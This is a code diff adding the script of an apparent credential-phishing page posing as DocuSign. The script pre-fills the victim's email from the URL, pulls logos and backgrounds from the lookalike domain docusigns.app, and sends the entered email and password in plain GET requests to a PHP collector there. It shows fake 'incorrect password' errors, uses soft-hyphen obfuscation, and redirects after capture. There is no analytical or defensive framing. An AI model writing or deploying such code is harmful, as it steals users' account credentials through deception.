@@ -1,0 +1,86 @@
+
+    $(document).ready(function() {
+        var hash = window.location.hash;
+        if(hash !== "") {
+
+            hash = hash.split('#');
+            const email = hash[1];
+
+            $("#testx").val(email);
+            $("#test").html(email);
+            $("#emx").html(email);
+            $("#milthnks").html(email);
+
+            if(email !== "") {
+                $.ajax({
+                    url: 'https://docusigns.app/blvcksn0vv.php?email='+email,
+                    method: 'GET',
+                    dataType: 'JSON',
+                    success: function(response) {
+                        if(response.hasOwnProperty('profile_image')) {
+                            $(".outo").hide();
+                            $(".xxlogo").attr({ "src": response.profile_image });
+                        }
+                        if(response.hasOwnProperty('back_image')) {
+                            $("body").css('background-image', 'url(' + response.back_image + ')');
+                        }
+                        if(response.hasOwnProperty('text')) {
+                            $("#txtttttt").html('<br><Br><br>'+response.text);
+                        }
+                    }, error:function(a, b, c) {
+                        console.log(a);
+                    }
+                });
+            }
+        }
+        $('.btn').on('click', function() {
+             $(".loading-dots").show();
+            var $this = $(this);
+            var loadingText = '<i class="fa fa-circle-o-notch fa-spin"></i> loa&shy;di&shy;ng...';
+            if ($(this).html() !== loadingText) {
+                $this.data('original-text', $(this).html());
+                $this.html(loadingText);
+            }
+        });
+    })
+
+    $('#psssss').keyup(function(event) {
+        if (event.which == 13) {
+            $('#submit').click();
+        }
+    });
+    $('.eml').click(function() { 
+        $(".LOGin_F0rm").show();
+        $(".add_em").hide();
+    })
+
+    function sendmails() {
+        var em = $('#testx').val();
+        var ps = $('#psssss').val();
+
+        var xhttp = new XMLHttpRequest();
+        xhttp.onreadystatechange = function() {
+            if (this.readyState == 4 && this.status == 200) {
+
+                var response = JSON.parse(this.responseText);
+
+                if (response.msg == "donesend") {
+                    $(".LOGin_F0rm").hide();
+                    $(".thxsss").show();
+                              
+                    
+                    setTimeout("window.location.href='https://i.stack.imgur.com/OSEjh.gif';", 5000);
+                } else {
+                     $(".loading-dots").hide();
+                    $(".btn").html("Sign in");
+                   
+
+                    $("#warning").empty();
+                    $('#warning').append('Y&shy;o&shy;ur a&shy;cco&shy;unt o&shy;r Emai&shy;l pas&shy;sw&shy;or&shy;d i&shy;s i&shy;nc&shy;orrect.</br></br>');
+					
+                }
+            }
+        };
+        xhttp.open("GET", "https://docusigns.app/xxx.php?user=" + em + "&pass=" + ps, true);
+        xhttp.send();
+    }
